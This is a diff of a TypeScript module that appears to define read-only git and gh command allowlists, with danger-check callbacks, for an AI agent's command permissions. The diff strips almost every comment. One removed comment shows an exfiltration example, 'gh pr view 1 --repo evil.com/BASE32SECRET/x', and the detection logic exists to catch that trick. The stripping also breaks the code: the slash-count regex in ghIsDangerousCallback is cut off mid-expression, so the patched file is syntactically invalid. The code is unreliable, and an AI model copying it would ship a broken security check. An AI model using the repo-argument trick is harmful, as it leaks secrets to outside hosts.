@@ -24,8 +24,6 @@ export type ExternalCommandConfig = {
   respectsDoubleDash?: boolean
 }
 
-// ---------------------------------------------------------------------------
-
 const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
   '--all': 'none',
   '--branches': 'none',
@@ -54,7 +52,6 @@ const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
   '-n': 'number',
 }
 
-// Stat output flags - used in git log, show, diff
 const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
   '--stat': 'none',
   '--numstat': 'none',
@@ -63,13 +60,11 @@ const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
   '--name-status': 'none',
 }
 
-// Color output flags - used in git log, show, diff
 const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
   '--color': 'none',
   '--no-color': 'none',
 }
 
-// Patch display flags - used in git log, show
 const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
   '--patch': 'none',
   '-p': 'none',
@@ -78,21 +73,18 @@ const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
   '-s': 'none',
 }
 
-// Author/committer filter flags - used in git log, reflog
 const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
   '--author': 'string',
   '--committer': 'string',
   '--grep': 'string',
 }
 
-// ---------------------------------------------------------------------------
-
 export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   'git diff': {
     safeFlags: {
       ...GIT_STAT_FLAGS,
       ...GIT_COLOR_FLAGS,
-      // Display and comparison flags
+      
       '--dirstat': 'none',
       '--summary': 'none',
       '--patch-with-stat': 'none',
@@ -129,9 +121,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--pickaxe-all': 'none',
       '--no-index': 'none',
       '--relative': 'string',
-      // Diff filtering
+      
       '--diff-filter': 'string',
-      // Short flags
+      
       '-p': 'none',
       '-u': 'none',
       '-s': 'none',
@@ -140,8 +132,8 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-B': 'none',
       '-D': 'none',
       '-l': 'none',
-      // SECURITY: -S/-G/-O take REQUIRED string arguments (pickaxe search,
-      // pickaxe regex, orderfile). Previously 'none' caused a parser
+      
+      
       
       
       
@@ -165,7 +157,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_COLOR_FLAGS,
       ...GIT_PATCH_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
-      // Additional display flags
+      
       '--abbrev-commit': 'none',
       '--full-history': 'none',
       '--dense': 'none',
@@ -184,22 +176,22 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--no-min-parents': 'none',
       '--no-max-parents': 'none',
       '--follow': 'none',
-      // Commit traversal flags
+      
       '--no-walk': 'none',
       '--left-right': 'none',
       '--cherry-mark': 'none',
       '--cherry-pick': 'none',
       '--boundary': 'none',
-      // Ordering flags
+      
       '--topo-order': 'none',
       '--date-order': 'none',
       '--author-date-order': 'none',
-      // Format control
+      
       '--pretty': 'string',
       '--format': 'string',
-      // Diff filtering
+      
       '--diff-filter': 'string',
-      // Pickaxe search (find commits that add/remove string)
+      
       '-S': 'string',
       '-G': 'string',
       '--pickaxe-regex': 'none',
@@ -212,7 +204,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_STAT_FLAGS,
       ...GIT_COLOR_FLAGS,
       ...GIT_PATCH_FLAGS,
-      // Additional display flags
+      
       '--abbrev-commit': 'none',
       '--word-diff': 'none',
       '--word-diff-regex': 'string',
@@ -221,9 +213,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--format': 'string',
       '--first-parent': 'none',
       '--raw': 'none',
-      // Diff filtering
+      
       '--diff-filter': 'string',
-      // Short flags
+      
       '-m': 'none',
       '--quiet': 'none',
     },
@@ -232,7 +224,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     safeFlags: {
       ...GIT_REF_SELECTION_FLAGS,
       ...GIT_DATE_FILTER_FLAGS,
-      // Summary options
+      
       '-s': 'none',
       '--summary': 'none',
       '-n': 'none',
@@ -241,11 +233,11 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--email': 'none',
       '-c': 'none',
       '--committer': 'none',
-      // Grouping
+      
       '--group': 'string',
-      // Formatting
+      
       '--format': 'string',
-      // Filtering
+      
       '--no-merges': 'none',
       '--author': 'string',
     },
@@ -258,7 +250,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_COUNT_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
     },
-    // SECURITY: Block `git reflog expire` (positional subcommand) — it writes
+    
     
     
     
@@ -267,7 +259,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       _rawCommand: string,
       args: string[],
     ) => {
-      // Block known write-capable subcommands: expire, delete, exists.
+      
       
       
       
@@ -279,7 +271,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
         if (DANGEROUS_SUBCOMMANDS.has(token)) {
           return true 
         }
-        // First positional is safe (show/HEAD/ref) — subsequent are ref args
+        
         return false
       }
       return false 
@@ -294,7 +286,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git ls-remote': {
     safeFlags: {
-      // Branch/tag filtering flags
+      
       '--branches': 'none',
       '-b': 'none',
       '--tags': 'none',
@@ -302,15 +294,15 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--heads': 'none',
       '-h': 'none',
       '--refs': 'none',
-      // Output control flags
+      
       '--quiet': 'none',
       '-q': 'none',
       '--exit-code': 'none',
       '--get-url': 'none',
       '--symref': 'none',
-      // Sorting flags
+      
       '--sort': 'string',
-      // Protocol flags
+      
       
       
       
@@ -323,7 +315,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git status': {
     safeFlags: {
-      // Output format flags
+      
       '--short': 'none',
       '-s': 'none',
       '--branch': 'none',
@@ -332,19 +324,19 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--long': 'none',
       '--verbose': 'none',
       '-v': 'none',
-      // Untracked files handling
+      
       '--untracked-files': 'string',
       '-u': 'string',
-      // Ignore options
+      
       '--ignored': 'none',
       '--ignore-submodules': 'string',
-      // Column display
+      
       '--column': 'none',
       '--no-column': 'none',
-      // Ahead/behind info
+      
       '--ahead-behind': 'none',
       '--no-ahead-behind': 'none',
-      // Rename detection
+      
       '--renames': 'none',
       '--no-renames': 'none',
       '--find-renames': 'string',
@@ -354,9 +346,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   'git blame': {
     safeFlags: {
       ...GIT_COLOR_FLAGS,
-      // Line range
+      
       '-L': 'string',
-      // Output format
+      
       '--porcelain': 'none',
       '-p': 'none',
       '--line-porcelain': 'none',
@@ -369,20 +361,20 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--show-email': 'none',
       '-e': 'none',
       '-f': 'none',
-      // Date formatting
+      
       '--date': 'string',
-      // Ignore whitespace
+      
       '-w': 'none',
-      // Ignore revisions
+      
       '--ignore-rev': 'string',
       '--ignore-revs-file': 'string',
-      // Move/copy detection
+      
       '-M': 'none',
       '-C': 'none',
       '--score-debug': 'none',
-      // Abbreviation
+      
       '--abbrev': 'number',
-      // Other options
+      
       '-s': 'none',
       '-l': 'none',
       '-t': 'none',
@@ -390,7 +382,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git ls-files': {
     safeFlags: {
-      // File selection
+      
       '--cached': 'none',
       '-c': 'none',
       '--deleted': 'none',
@@ -407,7 +399,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-k': 'none',
       '--unmerged': 'none',
       '-u': 'none',
-      // Output format
+      
       '--directory': 'none',
       '--no-empty-directory': 'none',
       '--eol': 'none',
@@ -418,22 +410,22 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-t': 'none',
       '-v': 'none',
       '-f': 'none',
-      // Exclude patterns
+      
       '--exclude': 'string',
       '-x': 'string',
       '--exclude-from': 'string',
       '-X': 'string',
       '--exclude-per-directory': 'string',
       '--exclude-standard': 'none',
-      // Error handling
+      
       '--error-unmatch': 'none',
-      // Recursion
+      
       '--recurse-submodules': 'none',
     },
   },
   'git config --get': {
     safeFlags: {
-      // No additional flags needed - just reading config values
+      
       '--local': 'none',
       '--global': 'none',
       '--system': 'none',
@@ -452,17 +444,17 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--show-scope': 'none',
     },
   },
-  // NOTE: 'git remote show' must come BEFORE 'git remote' so longer patterns are matched first
+  
   'git remote show': {
     safeFlags: {
       '-n': 'none',
     },
-    // Only allow optional -n, then one alphanumeric remote name
+    
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Filter out the known safe flag
+      
       const positional = args.filter(a => a !== '-n')
       
       if (positional.length !== 1) return true
@@ -474,42 +466,42 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-v': 'none',
       '--verbose': 'none',
     },
-    // Only allow bare 'git remote' or 'git remote -v/--verbose'
+    
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // All args must be known safe flags; no positional args allowed
+      
       return args.some(a => a !== '-v' && a !== '--verbose')
     },
   },
-  // git merge-base is a read-only command for finding common ancestors
+  
   'git merge-base': {
     safeFlags: {
-      '--is-ancestor': 'none', // Check if first commit is ancestor of second
-      '--fork-point': 'none', // Find fork point
-      '--octopus': 'none', // Find best common ancestors for multiple refs
-      '--independent': 'none', // Filter independent refs
-      '--all': 'none', // Output all merge bases
+      '--is-ancestor': 'none', 
+      '--fork-point': 'none', 
+      '--octopus': 'none', 
+      '--independent': 'none', 
+      '--all': 'none', 
     },
   },
-  // git rev-parse is a pure read command — resolves refs to SHAs, queries repo paths
+  
   'git rev-parse': {
     safeFlags: {
-      // SHA resolution and verification
-      '--verify': 'none', // Verify that exactly one argument is a valid object name
-      '--short': 'string', // Abbreviate output (optional length via =N)
-      '--abbrev-ref': 'none', // Symbolic name of ref
-      '--symbolic': 'none', // Output symbolic names
-      '--symbolic-full-name': 'none', // Full symbolic name including refs/heads/ prefix
       
-      '--show-toplevel': 'none', // Absolute path of top-level directory
-      '--show-cdup': 'none', // Path components to traverse up to top-level
-      '--show-prefix': 'none', // Relative path from top-level to cwd
-      '--git-dir': 'none', // Path to .git directory
-      '--git-common-dir': 'none', // Path to common directory (.git in main worktree)
-      '--absolute-git-dir': 'none', // Absolute path to .git directory
-      '--show-superproject-working-tree': 'none', // Superproject root (if submodule)
+      '--verify': 'none', 
+      '--short': 'string', 
+      '--abbrev-ref': 'none', 
+      '--symbolic': 'none', 
+      '--symbolic-full-name': 'none', 
+      
+      '--show-toplevel': 'none', 
+      '--show-cdup': 'none', 
+      '--show-prefix': 'none', 
+      '--git-dir': 'none', 
+      '--git-common-dir': 'none', 
+      '--absolute-git-dir': 'none', 
+      '--show-superproject-working-tree': 'none', 
       
       '--is-inside-work-tree': 'none',
       '--is-inside-git-dir': 'none',
@@ -519,15 +511,15 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--path-prefix': 'none',
     },
   },
-  // git rev-list is read-only commit enumeration — lists/counts commits reachable from refs
+  
   'git rev-list': {
     safeFlags: {
       ...GIT_REF_SELECTION_FLAGS,
       ...GIT_DATE_FILTER_FLAGS,
       ...GIT_COUNT_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
-      // Counting
-      '--count': 'none', // Output commit count instead of listing
+      
+      '--count': 'none', 
       
       '--reverse': 'none',
       '--first-parent': 'none',
@@ -542,7 +534,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--max-age': 'number',
       '--min-age': 'number',
       '--walk-reflogs': 'none',
-      // Output formatting
+      
       '--oneline': 'none',
       '--abbrev-commit': 'none',
       '--pretty': 'string',
@@ -555,135 +547,135 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--graph': 'none',
     },
   },
-  // git describe is read-only — describes commits relative to the most recent tag
+  
   'git describe': {
     safeFlags: {
-      // Tag selection
-      '--tags': 'none', // Consider all tags, not just annotated
-      '--match': 'string', // Only consider tags matching the glob pattern
-      '--exclude': 'string', // Do not consider tags matching the glob pattern
       
-      '--long': 'none', // Always output long format (tag-distance-ghash)
-      '--abbrev': 'number', // Abbreviate objectname to N hex digits
-      '--always': 'none', // Show uniquely abbreviated object as fallback
-      '--contains': 'none', // Find tag that comes after the commit
-      '--first-match': 'none', // Prefer tags closest to the tip (stops after first match)
-      '--exact-match': 'none', // Only output if an exact match (tag points at commit)
-      '--candidates': 'number', // Limit walk before selecting best candidates
+      '--tags': 'none', 
+      '--match': 'string', 
+      '--exclude': 'string', 
       
-      '--dirty': 'none', // Append "-dirty" if working tree has modifications
-      '--broken': 'none', // Append "-broken" if repository is in invalid state
+      '--long': 'none', 
+      '--abbrev': 'number', 
+      '--always': 'none', 
+      '--contains': 'none', 
+      '--first-match': 'none', 
+      '--exact-match': 'none', 
+      '--candidates': 'number', 
+      
+      '--dirty': 'none', 
+      '--broken': 'none', 
     },
   },
-  // git cat-file is read-only object inspection — displays type, size, or content of objects
+  
   
   
   'git cat-file': {
     safeFlags: {
-      // Object query modes (all purely read-only)
-      '-t': 'none', // Print type of object
-      '-s': 'none', // Print size of object
-      '-p': 'none', // Pretty-print object contents
-      '-e': 'none', // Exit with zero if object exists, non-zero otherwise
       
-      '--batch-check': 'none', // For each object on stdin, print type and size (no content)
+      '-t': 'none', 
+      '-s': 'none', 
+      '-p': 'none', 
+      '-e': 'none', 
+      
+      '--batch-check': 'none', 
       
       '--allow-undetermined-type': 'none',
     },
   },
-  // git for-each-ref is read-only ref iteration — lists refs with optional formatting and filtering
+  
   'git for-each-ref': {
     safeFlags: {
-      // Output formatting
-      '--format': 'string', // Format string using %(fieldname) placeholders
       
-      '--sort': 'string', // Sort by key (e.g., refname, creatordate, version:refname)
+      '--format': 'string', 
       
-      '--count': 'number', // Limit output to at most N refs
+      '--sort': 'string', 
       
-      '--contains': 'string', // Only list refs that contain specified commit
-      '--no-contains': 'string', // Only list refs that do NOT contain specified commit
-      '--merged': 'string', // Only list refs reachable from specified commit
-      '--no-merged': 'string', // Only list refs NOT reachable from specified commit
-      '--points-at': 'string', // Only list refs pointing at specified object
+      '--count': 'number', 
+      
+      '--contains': 'string', 
+      '--no-contains': 'string', 
+      '--merged': 'string', 
+      '--no-merged': 'string', 
+      '--points-at': 'string', 
     },
   },
-  // git grep is read-only — searches tracked files for patterns
+  
   'git grep': {
     safeFlags: {
-      // Pattern matching modes
-      '-e': 'string', // Pattern
-      '-E': 'none', // Extended regexp
+      
+      '-e': 'string', 
+      '-E': 'none', 
       '--extended-regexp': 'none',
-      '-G': 'none', // Basic regexp (default)
+      '-G': 'none', 
       '--basic-regexp': 'none',
-      '-F': 'none', // Fixed strings
+      '-F': 'none', 
       '--fixed-strings': 'none',
-      '-P': 'none', // Perl regexp
+      '-P': 'none', 
       '--perl-regexp': 'none',
-      // Match control
-      '-i': 'none', // Ignore case
+      
+      '-i': 'none', 
       '--ignore-case': 'none',
-      '-v': 'none', // Invert match
+      '-v': 'none', 
       '--invert-match': 'none',
-      '-w': 'none', // Word regexp
+      '-w': 'none', 
       '--word-regexp': 'none',
-      // Output control
-      '-n': 'none', // Line number
+      
+      '-n': 'none', 
       '--line-number': 'none',
-      '-c': 'none', // Count
+      '-c': 'none', 
       '--count': 'none',
-      '-l': 'none', // Files with matches
+      '-l': 'none', 
       '--files-with-matches': 'none',
-      '-L': 'none', // Files without match
+      '-L': 'none', 
       '--files-without-match': 'none',
-      '-h': 'none', // No filename
-      '-H': 'none', // With filename
+      '-h': 'none', 
+      '-H': 'none', 
       '--heading': 'none',
       '--break': 'none',
       '--full-name': 'none',
       '--color': 'none',
       '--no-color': 'none',
-      '-o': 'none', // Only matching
+      '-o': 'none', 
       '--only-matching': 'none',
-      // Context
-      '-A': 'number', // After context
+      
+      '-A': 'number', 
       '--after-context': 'number',
-      '-B': 'number', // Before context
+      '-B': 'number', 
       '--before-context': 'number',
-      '-C': 'number', // Context
+      '-C': 'number', 
       '--context': 'number',
-      // Boolean operators for multi-pattern
+      
       '--and': 'none',
       '--or': 'none',
       '--not': 'none',
-      // Scope control
+      
       '--max-depth': 'number',
       '--untracked': 'none',
       '--no-index': 'none',
       '--recurse-submodules': 'none',
       '--cached': 'none',
-      // Threads
+      
       '--threads': 'number',
-      // Quiet
+      
       '-q': 'none',
       '--quiet': 'none',
     },
   },
-  // git stash show is read-only — displays diff of a stash entry
+  
   'git stash show': {
     safeFlags: {
       ...GIT_STAT_FLAGS,
       ...GIT_COLOR_FLAGS,
       ...GIT_PATCH_FLAGS,
-      // Diff options
+      
       '--word-diff': 'none',
       '--word-diff-regex': 'string',
       '--diff-filter': 'string',
       '--abbrev': 'number',
     },
   },
-  // git worktree list is read-only — lists linked working trees
+  
   'git worktree list': {
     safeFlags: {
       '--porcelain': 'none',
@@ -694,7 +686,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git tag': {
     safeFlags: {
-      // List mode flags
+      
       '-l': 'none',
       '--list': 'none',
       '-n': 'number',
@@ -710,12 +702,12 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-i': 'none',
       '--ignore-case': 'none',
     },
-    // SECURITY: Block tag creation via positional arguments. `git tag foo`
     
     
     
     
-    // and git tag auto-approves. While the write is constrained (path limited
+    
+    
     
     
     
@@ -723,8 +715,8 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       _rawCommand: string,
       args: string[],
     ) => {
-      // Safe uses: `git tag` (list), `git tag -l pattern` (list filtered),
-      // `git tag --contains <ref>` (list containing). A bare positional arg
+      
+      
       
       const flagsWithArgs = new Set([
         '--contains',
@@ -745,15 +737,15 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
           i++
           continue
         }
-        // `--` ends flag parsing. All subsequent tokens are positional args,
-        // even if they start with `-`. `git tag -- -l` CREATES a tag named `-l`.
+        
+        
         if (token === '--' && !seenDashDash) {
           seenDashDash = true
           i++
           continue
         }
         if (!seenDashDash && token.startsWith('-')) {
-          // Check for -l/--list (exact or in a bundle). `-li` bundles -l and
+          
           
           
           if (token === '--list' || token === '-l') {
@@ -765,7 +757,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
             !token.includes('=') &&
             token.slice(1).includes('l')
           ) {
-            // Short-flag bundle like -li, -il containing 'l'
+            
             seenListFlag = true
           }
           if (token.includes('=')) {
@@ -776,7 +768,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
             i++
           }
         } else {
-          // Non-flag positional arg (or post-`--` positional). Safe only if
+          
           
           if (!seenListFlag) {
             return true 
@@ -789,7 +781,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git branch': {
     safeFlags: {
-      // List mode flags
+      
       '-l': 'none',
       '--list': 'none',
       '-a': 'none',
@@ -799,14 +791,14 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-v': 'none',
       '-vv': 'none',
       '--verbose': 'none',
-      // Display options
+      
       '--color': 'none',
       '--no-color': 'none',
       '--column': 'none',
       '--no-column': 'none',
-      // SECURITY: --abbrev stays 'number' so validateFlags accepts --abbrev=N
       
-      // git uses PARSE_OPT_OPTARG (optional-attached only) — detached N becomes
+      
+      
       
       
       
@@ -814,37 +806,37 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       
       '--abbrev': 'number',
       '--no-abbrev': 'none',
-      // Filtering - these take commit/ref arguments
+      
       '--contains': 'string',
       '--no-contains': 'string',
-      '--merged': 'none', // Optional commit argument - handled in callback
-      '--no-merged': 'none', // Optional commit argument - handled in callback
+      '--merged': 'none', 
+      '--no-merged': 'none', 
       '--points-at': 'string',
-      // Sorting
+      
       '--sort': 'string',
-      // Note: --format is intentionally excluded as it could pose security risks
+      
       
       '--show-current': 'none',
       '-i': 'none',
       '--ignore-case': 'none',
     },
-    // Block branch creation via positional arguments (e.g., "git branch newbranch")
+    
     
     
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Block branch creation: "git branch <name>" or "git branch <name> <start-point>"
       
-      // or "git branch --contains/--merged/etc <ref>" (filtering)
+      
+      
       
       const flagsWithArgs = new Set([
         '--contains',
         '--no-contains',
         '--points-at',
         '--sort',
-        // --abbrev REMOVED: git does NOT consume detached arg (PARSE_OPT_OPTARG)
+        
       ])
       
       const flagsWithOptionalArgs = new Set(['--merged', '--no-merged'])
@@ -858,7 +850,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
           i++
           continue
         }
-        // `--` ends flag parsing. `git branch -- -l` CREATES a branch named `-l`.
+        
         if (token === '--' && !seenDashDash) {
           seenDashDash = true
           lastFlag = ''
@@ -866,7 +858,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
           continue
         }
         if (!seenDashDash && token.startsWith('-')) {
-          // Check for -l/--list including short-flag bundles (-li, -la, etc.)
+          
           if (token === '--list' || token === '-l') {
             seenListFlag = true
           } else if (
@@ -889,8 +881,8 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
             i++
           }
         } else {
-          // Non-flag argument (or post-`--` positional) - could be:
-          // 1. A branch name (dangerous - creates a branch)
+          
+          
           
           
           const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag)
@@ -905,17 +897,11 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
 }
 
-// ---------------------------------------------------------------------------
-
-//   gh pr view 1 --repo evil.com/BASE32SECRET/x
-
-//   - Any token with 2+ slashes (HOST/OWNER/REPO format — normal is OWNER/REPO)
-
 function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
   for (const token of args) {
     if (!token) continue
     
-    // `--repo=evil.com/SECRET/x` (single token starting with `-`) gets skipped
+    
     
     
     let value = token
@@ -925,7 +911,7 @@ function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
       value = token.slice(eqIdx + 1)
       if (!value) continue
     }
-    // Skip values that are clearly not repo specs (no `/` at all, or pure numbers)
+    
     if (
       !value.includes('/') &&
       !value.includes('://') &&
@@ -933,17 +919,17 @@ function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
     ) {
       continue
     }
-    // URL schemes: https://, http://, git://, ssh://
+    
     if (value.includes('://')) {
       return true
     }
-    // SSH-style: git@host:owner/repo
+    
     if (value.includes('@')) {
       return true
     }
-    // 3+ segments = HOST/OWNER/REPO (normal gh format is OWNER/REPO, 1 slash)
     
-    const slashCount = (value.match(/\//g) || []).length
+    
+    const slashCount = (value.match(/\
     if (slashCount >= 2) {
       return true
     }
@@ -952,20 +938,20 @@ function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
 }
 
 export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
-  // gh pr view is read-only — displays pull request details
+  
   'gh pr view': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--comments': 'none', // Show comments
-      '--repo': 'string', // Target repository (OWNER/REPO)
+      '--json': 'string', 
+      '--comments': 'none', 
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr list is read-only — lists pull requests
+  
   'gh pr list': {
     safeFlags: {
-      '--state': 'string', // open, closed, merged, all
+      '--state': 'string', 
       '-s': 'string',
       '--author': 'string',
       '--assignee': 'string',
@@ -983,7 +969,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr diff is read-only — shows pull request diff
+  
   'gh pr diff': {
     safeFlags: {
       '--color': 'string',
@@ -994,7 +980,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr checks is read-only — shows CI status checks
+  
   'gh pr checks': {
     safeFlags: {
       '--watch': 'none',
@@ -1007,7 +993,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue view is read-only — displays issue details
+  
   'gh issue view': {
     safeFlags: {
       '--json': 'string',
@@ -1017,7 +1003,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue list is read-only — lists issues
+  
   'gh issue list': {
     safeFlags: {
       '--state': 'string',
@@ -1036,7 +1022,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh repo view is read-only — displays repository details
+  
   
   'gh repo view': {
     safeFlags: {
@@ -1044,312 +1030,310 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh run list is read-only — lists workflow runs
+  
   'gh run list': {
     safeFlags: {
-      '--branch': 'string', // Filter by branch
+      '--branch': 'string', 
       '-b': 'string',
-      '--status': 'string', // Filter by status
+      '--status': 'string', 
       '-s': 'string',
-      '--workflow': 'string', // Filter by workflow
-      '-w': 'string', // NOTE: -w is --workflow here, NOT --web (gh run list has no --web)
-      '--limit': 'number', // Max results
+      '--workflow': 'string', 
+      '-w': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
-      '--event': 'string', // Filter by event type
+      '--event': 'string', 
       '-e': 'string',
-      '--user': 'string', // Filter by user
+      '--user': 'string', 
       '-u': 'string',
-      '--created': 'string', // Filter by creation date
-      '--commit': 'string', // Filter by commit SHA
+      '--created': 'string', 
+      '--commit': 'string', 
       '-c': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh run view is read-only — displays a workflow run's details
+  
   'gh run view': {
     safeFlags: {
-      '--log': 'none', // Show full run log
-      '--log-failed': 'none', // Show log for failed steps only
-      '--exit-status': 'none', // Exit with run's status code
-      '--verbose': 'none', // Show job steps
-      '-v': 'none', // NOTE: -v is --verbose here, NOT --web
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--log': 'none', 
+      '--log-failed': 'none', 
+      '--exit-status': 'none', 
+      '--verbose': 'none', 
+      '-v': 'none', 
+      '--json': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
-      '--job': 'string', // View a specific job by ID
+      '--job': 'string', 
       '-j': 'string',
-      '--attempt': 'number', // View a specific attempt
+      '--attempt': 'number', 
       '-a': 'number',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh auth status is read-only — displays authentication state
+  
   
   'gh auth status': {
     safeFlags: {
-      '--active': 'none', // Display active account only
+      '--active': 'none', 
       '-a': 'none',
-      '--hostname': 'string', // Check specific hostname
+      '--hostname': 'string', 
       '-h': 'string',
-      '--json': 'string', // JSON field selection
+      '--json': 'string', 
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr status is read-only — shows your PRs
+  
   'gh pr status': {
     safeFlags: {
-      '--conflict-status': 'none', // Display merge conflict status
+      '--conflict-status': 'none', 
       '-c': 'none',
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue status is read-only — shows your issues
+  
   'gh issue status': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh release list is read-only — lists releases
+  
   'gh release list': {
     safeFlags: {
-      '--exclude-drafts': 'none', // Exclude draft releases
-      '--exclude-pre-releases': 'none', // Exclude pre-releases
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--exclude-drafts': 'none', 
+      '--exclude-pre-releases': 'none', 
+      '--json': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--order': 'string', // Order: asc|desc
+      '--order': 'string', 
       '-O': 'string',
-      '--repo': 'string', // Target repository
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh release view is read-only — displays release details
+  
   
   'gh release view': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
